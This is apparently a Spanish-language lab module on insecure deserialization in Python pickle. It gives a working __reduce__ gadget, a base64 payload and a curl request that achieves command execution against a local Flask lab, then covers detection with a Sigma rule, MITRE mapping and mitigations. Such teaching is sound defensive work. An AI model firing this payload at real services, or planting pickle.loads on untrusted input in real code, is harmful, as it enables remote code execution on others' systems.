# 🥒 Deserializacion insegura → RCE (pickle)

> **⚠️ Marco de uso.** Todo lo que sigue es para **objetivos autorizados** y **laboratorio local** unicamente. El lab corre en `127.0.0.1` (tu propia maquina). No apuntes estas tecnicas a sistemas de terceros: la deserializacion insegura da ejecucion de codigo, y ejecutarla sin permiso es un delito.

---

## 1. Que es y por que importa

Cuando un programa **serializa** un objeto, lo convierte en una cadena de bytes para guardarlo o enviarlo por la red. **Deserializar** es el camino inverso: reconstruir el objeto a partir de esos bytes.

El problema es que muchos deserializadores no se limitan a "rellenar datos": **reconstruyen objetos arbitrarios ejecutando metodos** durante el proceso. Si un atacante controla los bytes de entrada, puede fabricar un objeto malicioso —un **gadget**— cuyo proceso de reconstruccion **ejecuta codigo elegido por el**.

La clave que hace esto tan peligroso: **el codigo se ejecuta durante la deserializacion misma**, antes de que el programa siquiera use el objeto. No hace falta que la aplicacion "haga algo" con el dato; basta con que lo deserialice.

**Impacto:** ejecucion remota de codigo (RCE) con los privilegios del proceso. Es una de las clases del OWASP Top 10 (A08:2021 – Software and Data Integrity Failures) y afecta a multiples ecosistemas:

| Lenguaje | Mecanismo inseguro |
|---|---|
| Python | `pickle.loads()` |
| Java | `ObjectInputStream.readObject()` |
| PHP | `unserialize()` |
| .NET | `BinaryFormatter.Deserialize()` |
| YAML | `yaml.load()` inseguro (sin `SafeLoader`) |

En este modulo lo demostramos con **pickle** en Python, el caso mas directo de entender.

---

## 2. Montar el lab

Usamos el lab local de la comunidad, `vulnlab.py`.

```bash
pip install flask requests lxml pyjwt
python3 vulnlab.py
```

El servidor arranca y escucha en:

```
http://127.0.0.1:5000
```

El endpoint que nos interesa es `POST /load`. Su codigo vulnerable es literalmente:

```python
obj = pickle.loads(base64.b64decode(data))   # 'data' = body del POST
```

Es decir: toma el cuerpo de la peticion, lo decodifica de base64 y lo pasa **directo** a `pickle.loads()`. No hay validacion, ni allow-list de clases, ni firma. Datos no confiables → deserializador peligroso. Ese es el patron vulnerable.

---

## 3. El ataque paso a paso

### 3.1 Fabricar el gadget

En pickle, cualquier objeto puede definir un metodo magico `__reduce__`. Ese metodo le dice al deserializador: *"para reconstruirme, llama a **este** callable con **estos** argumentos"*. Un uso legitimo seria devolver un constructor y sus datos. El atacante, en cambio, devuelve un **callable peligroso**.

Objeto malicioso (minimo):

```python
import pickle, base64, subprocess

class Exploit:
    def __reduce__(self):
        return (subprocess.check_output, (["id"],))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

`__reduce__` devuelve la tupla `(subprocess.check_output, (["id"],))`. Traducido: *"cuando me deserialices, ejecuta `subprocess.check_output(["id"])`"*. Ahi es donde el atacante inyecta el comando.

El payload resultante en base64 (verificado):

```
gASVKwAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5RdlIwCaWSUYYWUUpQu
```

> **Verificado con `pickletools.dis`** (desensamblado, sin ejecutar): son 54 bytes, protocolo 4, con la secuencia `SHORT_BINUNICODE 'subprocess'` → `SHORT_BINUNICODE 'check_output'` → `STACK_GLOBAL` → lista `['id']` → `TUPLE1` → `REDUCE`. Es exactamente la traduccion de `(subprocess.check_output, (["id"],))`. Nota: el string literal `__reduce__` **no** aparece en los bytes del pickle; `__reduce__` es el metodo que se usa al *serializar*, no algo que quede grabado en el stream.

### 3.2 Enviarlo al endpoint

```bash
curl -X POST http://127.0.0.1:5000/load \
  --data 'gASVKwAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5RdlIwCaWSUYYWUUpQu'
```

### 3.3 Respuesta real del servidor

```
deserializado: b'uid=1000(Meowju) gid=1000(Meowju) groups=1000(Meowju),...'
```

El servidor devolvio la salida del comando `id` ejecutado **en su propia maquina**. Eso es **RCE**: logramos ejecutar `id` en el momento en que el servidor llamo a `pickle.loads()` sobre nuestro payload. Cambiar `["id"]` por cualquier otro comando (por ejemplo un reverse shell) daria control completo del proceso.

### 3.4 Por que funciona (mecanismo)

pickle es una **maquina de opcodes**: el flujo de bytes es un pequeno programa que el interprete de pickle ejecuta para reconstruir el objeto. Dos opcodes son el corazon del problema:

- **`STACK_GLOBAL`** (opcode `\x93`; en protocolos antiguos el equivalente era `GLOBAL` = `c`): importa un objeto por nombre a partir de dos strings apilados —modulo y atributo—, por ejemplo `subprocess` + `check_output`. En nuestro payload, al desensamblarlo, podes ver `subprocess` y `check_output` como `SHORT_BINUNICODE` (texto claro).
- **`REDUCE`** (opcode `R`, byte `0x52`): toma de la pila un callable y una tupla de argumentos y **lo invoca**. *(El byte `\x94` que aparece intercalado en el desensamblado es `MEMOIZE` —cachea objetos ya construidos— y no forma parte de `REDUCE`.)*

Cuando definimos `__reduce__`, le estamos dictando exactamente esos opcodes al serializador: "importa `subprocess.check_output`, apila `["id"]`, y llamalo". El deserializador obedece sin preguntar si eso es seguro.

El fragmento vulnerable, una vez mas, es la ausencia de cualquier control:

```python
obj = pickle.loads(base64.b64decode(data))   # 'data' viene del atacante
```

pickle **no distingue** entre "reconstruir una lista" y "ejecutar `subprocess`". Para el, ambas son solo secuencias de opcodes validas. Por eso la regla de oro es que pickle (y sus equivalentes en Java, PHP, .NET, YAML) **nunca** deben recibir datos no confiables.

> **Nota de honestidad tecnica.** En este lab verificamos la **cadena completa**: el payload se envio, se deserializo, y el servidor devolvio la salida real de `id` ejecutado en su host. No es solo un callback teorico: es ejecucion de comando confirmada de punta a punta.

---

## 4. Blue Team

### 4.1 Firma de deteccion

La firma conceptual es simple: **deserializar entrada controlada por el usuario**. En la practica se busca:

- **Python / pickle:** presencia de opcodes `STACK_GLOBAL`/`REDUCE` y nombres de modulos peligrosos (`subprocess`, `os`, `posix`, `builtins.exec`) dentro de blobs base64 o binarios. En el propio payload de este modulo aparecen las cadenas `subprocess` y `check_output` embebidas (visibles al decodificar el base64), porque `STACK_GLOBAL` referencia el callable por nombre en texto claro.
- **Java:** magic bytes `AC ED 00 05` al inicio del stream serializado, que en base64 empiezan con `rO0`. Nombres de gadgets conocidos (`CommonsCollections`, `Spring`, `Rome`) dentro del payload.
- General: endpoints que aceptan blobs binarios/base64 opacos como body y los procesan sin esquema.

### 4.2 Regla Sigma

```yaml
title: Posible payload de deserializacion insegura (pickle / Java)
id: 7f3c1e2a-9b64-4d18-a5c7-2e0f4b8d9a11
status: experimental
description: >
  Detecta indicadores de payloads de deserializacion maliciosos en trafico
  o logs de aplicacion: nombres de callables/modulos peligrosos de pickle
  (embebidos en base64) o el magic header de Java serializado en cuerpos de
  peticion.
logsource:
  category: webserver
  product: application
detection:
  selection_python:
    # base64offset|contains re-codifica la cadena en las 3 alineaciones base64
    # y la busca en el body: matchea porque el pickle lleva estos nombres en
    # texto claro y luego se transmite en base64.
    request_body|base64offset|contains:
      - 'subprocess'
      - 'check_output'
      - 'os\nsystem'
      - 'posix\nsystem'
  selection_java:
    request_body|contains:
      - 'rO0AB'          # AC ED 00 05 en base64
  condition: selection_python or selection_java
falsepositives:
  - Aplicaciones que legitimamente reciben objetos serializados de fuentes confiables
  - Blobs base64 que casualmente contienen estas subcadenas
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - attack.execution
  - attack.t1059
```

> El campo `id` es un UUID v4 valido (formato 8-4-4-4-12 hexadecimal). Reemplazalo por uno propio si integras la regla en tu pipeline.
>
> **Por que se quito la deteccion por `__reduce__`.** Una version anterior de esta regla buscaba el string literal `__reduce__` en el body. Es un falso indicador: `__reduce__` es el metodo que Python invoca al *serializar*, pero ese texto **no** queda en los bytes del pickle (el stream solo lleva el nombre del callable —`subprocess`/`check_output`— y el opcode `REDUCE`). Ademas el body viaja en base64, con lo que tampoco apareceria en claro. La deteccion real se apoya en los nombres de modulo/callable via `base64offset`, que si matchean el payload.

### 4.3 MITRE ATT&CK

| Tactica | Tecnica | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | **T1190** |
| Execution | Command and Scripting Interpreter | **T1059** |

La cadena tipica es **T1190 → T1059**: se explota la aplicacion expuesta (el endpoint `/load`) para lograr ejecucion de comandos en el interprete del host.

### 4.4 Mitigacion / parche

| Medida | Detalle |
|---|---|
| **No deserializar datos no confiables** | La unica defensa robusta. Nunca pasar input de usuario a `pickle.loads()`, `ObjectInputStream.readObject()`, `unserialize()` ni `BinaryFormatter.Deserialize()`. |
| **Usar formatos de datos seguros** | Para intercambio de datos, usar **JSON** (u otro formato puramente declarativo) con **validacion por esquema**. JSON no reconstruye objetos arbitrarios ni ejecuta metodos. |
| **YAML seguro** | Si usas YAML, siempre `yaml.safe_load()` (nunca `yaml.load()` sin `SafeLoader`). |
| **Firmar los datos (HMAC)** | Si *inevitablemente* necesitas serializar objetos, firmar el blob con HMAC y verificar la firma **antes** de deserializar, para garantizar integridad y origen. |
| **Allow-list de clases** | En Java (`ObjectInputFilter` / `resolveClass`) o pickle personalizado (`find_class` restringido), restringir explicitamente que clases pueden reconstruirse. |
| **Menor privilegio** | Ejecutar el servicio con el minimo de permisos posible para reducir el impacto de un RCE. |

---

## 5. Q&A

**P1. Si el objeto es "solo datos", ¿por que se ejecuta codigo?**
Porque pickle no reconstruye solo datos: ejecuta un pequeno programa de opcodes que puede *importar* y *llamar* cualquier callable via `STACK_GLOBAL` + `REDUCE`. El metodo `__reduce__` es el mecanismo legitimo que el atacante secuestra para inyectar `subprocess.check_output`. Para pickle, "reconstruir una lista" y "ejecutar un comando" son la misma clase de operacion.

**P2. ¿Alcanza con validar el tamano o el formato base64 del input?**
No. El payload es base64 valido y de tamano modesto (54 bytes); pasa cualquier chequeo superficial. La ejecucion ocurre *dentro* de `pickle.loads()`, no en una capa que puedas filtrar con una regex de formato. La unica defensa real es **no deserializar** ese input con pickle.

**P3. Uso Java / PHP / .NET, no Python. ¿Me afecta?**
Si. Es la misma clase de vulnerabilidad. Java tiene cadenas de gadgets famosas (CommonsCollections via `ObjectInputStream`), PHP tiene POP chains via `unserialize()`, y .NET via `BinaryFormatter` (tan peligroso que Microsoft lo deprecio y lo removio en versiones recientes de .NET). El patron —deserializar bytes no confiables que reconstruyen objetos— es identico; solo cambia la sintaxis del gadget.

**P4. Necesito enviar objetos entre servicios. ¿Como lo hago seguro?**
Preferi un formato declarativo: **JSON con validacion por esquema**. JSON describe datos, no reconstruye objetos ejecutables. Si de verdad necesitas serializar objetos ricos, agrega **HMAC** para verificar integridad/origen antes de deserializar y una **allow-list** estricta de clases permitidas. La firma no vuelve seguro a pickle contra un atacante que conozca la clave, pero impide que un tercero sin ella inyecte payloads.